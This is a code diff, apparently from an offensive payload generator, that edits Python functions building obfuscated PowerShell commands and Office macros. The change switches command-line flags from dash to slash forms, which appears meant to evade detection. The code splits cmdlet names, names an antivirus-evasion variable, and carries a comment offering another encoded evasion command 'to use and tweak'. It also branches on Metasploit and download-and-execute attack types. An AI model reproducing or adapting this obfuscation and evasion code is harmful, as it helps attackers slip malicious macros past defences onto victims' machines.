@@ -356,7 +356,7 @@ def generate_macro(full_attack, line_length=380):
     macro_str = macro_str[:-4]
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
-    macro_str = macro_str.replace('powershell -w 1 -C "', r'-w 1 -C ""')
+    macro_str = macro_str.replace('powershell /w 1 -C "', r'/w 1 -C ""')
     macro_str = macro_str.replace("')", "')\"\"")
 
     # obfsucate the hell out of Shell and PowerShell
@@ -370,7 +370,7 @@ def generate_macro(full_attack, line_length=380):
     # shell
     shell = long_string[3]
 
-    macro_str = macro_str.replace('powershell -w 1', ps_short + ' & " -w 1')
+    macro_str = macro_str.replace('powershell /w 1', ps_short + ' & " /w 1')
     macro_str = macro_str.replace(';powershell', ';" & "' + ps_short + ' & "')
 
     # randomized variables
@@ -611,7 +611,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         haha_av = haha_av.replace("==", "'+'==")
         counter = 1
 
-    full_attack = '''powershell -w 1 -C "s''v {0} -;s''v {1} e''c;s''v {2} ((g''v {3}).value.toString()+(g''v {4}).value.toString());powershell (g''v {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+    full_attack = '''powershell /w 1 /C "s''v {0} -;s''v {1} e''c;s''v {2} ((g''v {3}).value.toString()+(g''v {4}).value.toString());powershell (g''v {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
 
     if attack_type == "msf" or attack_type == "download/exec":
